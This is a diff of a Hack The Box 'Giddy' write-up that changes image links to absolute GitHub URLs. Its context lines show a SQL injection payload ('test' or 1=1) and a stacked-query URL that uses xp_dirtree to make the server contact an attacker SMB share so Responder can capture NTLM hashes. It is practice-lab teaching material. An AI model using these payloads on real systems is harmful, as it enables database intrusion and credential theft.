@@ -52,12 +52,12 @@ https://10.10.10.104:443/mvc                  (Status: 301) [Size: 152] [--> htt
 
 Accessing http://giddy.htb/remote, we realized that this site can only be accessed via https protocol
 
-![https protocol](./Images/https_protocol.png)
+![https protocol](https://github.com/joelczk/writeups/blob/main/HTB/Images/Giddy/https_protocol.png)
 
 Accessing https://giddy.htb/remote, we realize that this site is a Windows Server 2016 and its a login page for Windows Powershell Web Access. To login to the site, we would require a set of credentials but we do not have it yet. We would have to enumerate our sites to find the credentails.
 
 Navigating to http://giddy.htb/mvc/Search.aspx, we realize that there is an SQL Injection vulnerability as we are able to dump all the products using the ```test' or 1=1``` as the payload.
-![SQL Injection](./Images/sql_injection.png)
+![SQL Injection](https://github.com/joelczk/writeups/blob/main/HTB/Images/Giddy/sql_injection.png)
 
 Since we know that the backend of this machine is Microsoft, we can guess that the database that we are working with would be mssql. 
 
@@ -284,7 +284,7 @@ From the response that we have intercepted using Burp Suite, we can see that the
 
 We also found another endpoint that is vulnerable, http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=1 that is vulnerable to SQL Injection as well. 
 
-![SQL Injection in product.aspx](./Images/product_aspx_sql_injection.png)
+![SQL Injection in product.aspx](https://github.com/joelczk/writeups/blob/main/HTB/Images/Giddy/product_aspx_sql_injection.png)
 
 The same exploitation could be used to extract the NTLM hashes by visiting http://giddy.htb/mvc/Product.aspx?ProductSubCategoryId=8;use%20master;EXEC%20xp_dirtree%20%22\\10.10.16.6\share%22;--%20-. The hashes can then be captured by the responder that is listening on our local machine. 
 
